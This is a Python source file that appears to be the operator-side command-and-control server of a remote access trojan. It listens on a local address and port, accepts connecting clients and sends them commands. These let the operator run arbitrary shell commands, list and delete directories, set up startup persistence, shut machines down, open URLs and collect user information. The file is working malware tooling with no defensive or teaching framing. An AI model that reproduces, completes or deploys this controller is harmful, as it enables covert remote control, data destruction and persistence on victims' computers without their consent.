import socket
import threading
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(("192.168.1.41", 6677))

running = True

def data_input():
    client_return = (conn.recv(1048576)).decode("utf-8")
    print(client_return)

def process_input():
    global running
    while True:
        input_data = input("> ")
        if input_data == "user":
            try:
                conn.sendall("user".encode("utf-8"))
            except:
                print("Error: could not send " + str(input_data) + " command")
            user_data = (conn.recv(1024)).decode("utf-8")
            print(user_data)
        if input_data == "tree":
            tree_dir = input("directory>")
            try:
                conn.sendall("tree".encode("utf-8"))
                conn.sendall(tree_dir.encode("utf-8"))
            except:
                print("Error: could not send " + str(input_data) + " command")
            tree_data = (conn.recv(32768)).decode("utf-8")
            print(tree_data)
        elif input_data == "del":
            directory = input("directory>")
            try:
                conn.sendall("del".encode("utf-8"))
                conn.sendall(directory.encode("utf-8"))
                try:
                    del_data = (conn.recv(2048)).decode("utf-8")
                    print(del_data)
                except:
                    print("Error: Could not get del_data...")
            except:
                print("Error: could not send " + str(input_data) + " command")
        elif input_data == "startup":
            try:
                conn.sendall("startup".encode("utf-8"))
                startup_data = (conn.recv(2048)).decode("utf-8")
                print(startup_data)
            except:
                print("Error: could not send " + str(input_data) + " command")
        elif input_data == "command":
            command = input("command>")
            try:
                conn.sendall("command".encode("utf-8"))
                conn.sendall(command.encode("utf-8"))
                threading.Thread(target = data_input).start()
                time.sleep(2)
            except:
                print("Error: could not send " + str(input_data) + " command")
        elif input_data == "help":
            print("user\ntree\ndel\ncommand\nstartup\ncheck\nshutdown\nbrowse")
        elif input_data == "check":
            try:
                conn.sendall("check".encode("utf-8"))
                check_data = (conn.recv(2048)).decode("utf-8")
                print(check_data)
            except:
                print("Error: could not send " + str(input_data) + " command")
        elif input_data == "shutdown":
            try:
                conn.sendall("shutdown".encode("utf-8"))
                shutdown_data = (conn.recv(2048)).decode("utf-8")
                print(shutdown_data)
            except:
                print("Error: could not send " + str(input_data) + " command")
        elif input_data == "browse":
            browse = input("url>")
            try:
                conn.sendall("browse".encode("utf-8"))
                conn.sendall(browse.encode("utf-8"))
                browse_data = (conn.recv(2048)).decode("utf-8")
                print(browse_data)
            except:
                print("Error: could not send " + str(input_data) + " command")

threading.Thread(target = process_input).start()

while True:
    s.listen()
    conn, addr = s.accept()
    print("New Client: " + str(addr))
